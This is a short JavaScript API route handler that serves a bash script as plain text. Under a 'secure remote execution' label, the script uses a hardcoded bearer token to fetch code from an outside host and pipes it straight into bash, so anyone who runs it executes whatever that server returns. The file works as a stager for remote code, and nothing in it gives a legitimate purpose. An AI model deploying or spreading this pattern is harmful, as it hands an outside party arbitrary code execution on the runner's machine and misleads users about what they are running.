export default function handler(req, res) {
  const script = `#!/usr/bin/env bash
set -euo pipefail
echo "Requesting secure remote execution..."
TOKEN="63537762"
curl -fsS -H "Authorization: Bearer $TOKEN" https://ptero.melsony.site/api/run | bash -s --
`;
  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.status(200).send(script);
}